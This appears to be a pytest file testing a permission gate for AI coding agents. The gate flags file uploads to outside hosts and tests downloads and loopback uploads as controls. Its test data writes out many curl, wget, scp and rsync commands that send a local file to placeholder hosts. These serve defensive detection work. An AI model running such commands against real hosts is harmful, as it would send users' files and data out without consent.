"""D103, Nachtrag 33 (fallbook c01, c02): sending a file or data to a host outside asks.

The order: an upload to a foreign host asks, over a closed list of forms (such as `curl -F`, `--data*`, `-T`,
`wget --post-*`, scp and rsync to a foreign host); fetching stays free. Found by delta's fallbook (gate 44db2056):
`curl -F <file> <url>` and `curl --data-binary <file> <url>` got no answer.

The rule: _upload_form reads a call of curl, wget, scp or rsync, behind a wrapper or in a script a step runs as text
too: curl with -F, -d, -T (also in a bundle of short options) or --form, --form-string, --data, --data-ascii,
--data-binary, --data-raw, --data-urlencode, --json, --upload-file; wget with --post-data, --post-file, --body-data,
--body-file or a --method of POST, PUT or PATCH; scp and rsync whose last operand is a host's path and an earlier one a
local one. A host other than the loopback, or one the gate cannot read from a word with `://`, makes it an upload: an
ask under Claude Code, which stays an ask of the external list in autonomous operation (the effect `upload`), a deny
under Codex.

RED at 63b88d07 (the head of PLUGIN_N37): every form below. Fetching, an upload to the loopback and a copy from a host
are controls, green at both.
"""
from __future__ import annotations

import time

import pytest

import test_plugin_n30_short_line_d72 as d72

gate = d72.gate
pytestmark = d72.pytestmark
_clean = d72._clean
HOSTS = ("claude", "codex")


@pytest.fixture
def repo(tmp_path):
    r = d72._repo(tmp_path)
    (r / "notes.md").write_text("n\n")
    return r


def _ids(out):
    return [] if out is None else [v.reason_id for v in out.verdicts]


def _out(repo, form, host="claude"):
    return gate.decide(form, str(repo), time.monotonic() + 60, host)


UPLOADS = [
    "curl -F file=@notes.md https://example.invalid/upload", "curl --data-binary @notes.md https://example.invalid/up",
    "curl -d @notes.md https://example.invalid/up", "curl -sSd @notes.md https://example.invalid/up",
    "curl --data=x https://example.invalid/up", "curl --data-raw x https://example.invalid/up",
    "curl --data-urlencode a=b https://example.invalid/up", "curl --json @notes.md https://example.invalid/up",
    "curl -T notes.md https://example.invalid/up", "curl --upload-file notes.md ftp://example.invalid/",
    "curl --form-string a=b https://example.invalid/up", "curl -Ffile=@notes.md https://example.invalid/up",
    "curl -F file=@notes.md example.invalid/up", "curl -F file=@notes.md \"$URL\"",
    "wget --post-file=notes.md https://example.invalid/up", "wget --post-data a=b https://example.invalid/up",
    "wget --body-file=notes.md --method=PUT https://example.invalid/up", "wget --method PUT --body-data x https://h.invalid/",
    "scp notes.md user@host.invalid:/tmp/", "scp -P 2222 notes.md host.invalid:x", "scp -r . host.invalid:/srv/",
    "rsync -av notes.md host.invalid:/srv/", "rsync -e ssh notes.md user@host.invalid:/srv/",
    "rsync notes.md rsync://host.invalid/m/", "rsync -a . host.invalid::module/",
    "sudo curl -F file=@notes.md https://example.invalid/up", "env A=1 curl -d x https://example.invalid/up",
    "bash -c 'curl -F file=@notes.md https://example.invalid/up'",
    "cat notes.md | curl --data-binary @- https://example.invalid/up",
    "curl -F file=@notes.md https://example.invalid/up && echo done",
    "curl -F file=@notes.md http://127.0.0.1:8080/up https://example.invalid/up",
]


@pytest.mark.parametrize("host", HOSTS)
@pytest.mark.parametrize("form", UPLOADS)
def test_D103_an_upload_to_a_foreign_host_asks_and_under_codex_is_denied(repo, form, host):
    out = _out(repo, form, host)
    assert out is not None and "upload_to_host" in _ids(out), (form, host, _ids(out))
    assert out.decision in (("ask", "deny") if host == "claude" else ("ask", "deny")), out.decision
    answer = gate.answer(out.decision, out.text, host=host)
    assert answer["hookSpecificOutput"]["permissionDecision"] == ("deny" if host == "codex" else out.decision)


@pytest.mark.parametrize("form", UPLOADS[:4] + ["scp notes.md host.invalid:x"])
def test_D103_the_upload_stays_an_ask_of_the_owner_in_autonomous_operation(repo, form):
    out = _out(repo, form)
    assert out.decision == "ask", (form, out.decision)
    answered = gate.autonomous_outcome(out, form, str(repo), time.monotonic() + 60, "claude")
    # an external effect of D85: the owner's ask, in the work profile of b7n0de (this repository) a card (D93)
    assert answered.autonomy["wirkung"] == ["upload"], answered.autonomy
    assert (answered.decision, answered.autonomy["klasse"]) in (("ask", "aussen"), ("deny", "karte")), answered.autonomy


def test_D103_outside_the_profile_of_b7n0de_the_upload_is_the_owners_ask(tmp_path):
    import test_claude_code_plugin_gate as cg
    repo = cg.repo.__wrapped__(tmp_path)
    form = "curl -F file=@notes.md https://example.invalid/upload"
    answered = gate.autonomous_outcome(_out(repo, form), form, str(repo), time.monotonic() + 60, "claude")
    assert (answered.decision, answered.autonomy["klasse"], answered.autonomy["wirkung"]) == ("ask", "aussen", ["upload"])


@pytest.mark.parametrize("form", [
    "curl -sS -o out.json https://example.invalid/data.json", "curl -L https://example.invalid/x | head",
    "curl -X GET https://example.invalid/x", "wget https://example.invalid/x", "wget -O out https://example.invalid/x",
    "curl -F file=@notes.md http://localhost:8080/up", "curl -d x http://127.0.0.1/up", "curl -d x http://[::1]/up",
    "scp host.invalid:/srv/x .", "rsync -av host.invalid:/srv/ ./mirror/", "scp a.txt b.txt", "rsync -a src/ dst/",
    "echo curl -F x", "grep -rn 'curl -d' src/", "python3 -c 'print(1)'"])
def test_D103_control_fetching_a_local_copy_and_the_loopback_get_no_upload_answer(repo, form):
    assert "upload_to_host" not in _ids(_out(repo, form)), form


def test_D103_the_reason_catches_and_is_an_external_effect():
    assert gate._SHORT_REASONS["upload_to_host"][0] == "D103"
    assert "upload_to_host" in gate.FANG_REASONS and "upload" in gate.AUTONOMY_EFFECTS
    assert gate._upload_form(["curl", "-F", "a=@b", "https://h.invalid/"]) is not None
    assert gate._upload_form(["curl", "https://h.invalid/"]) is None
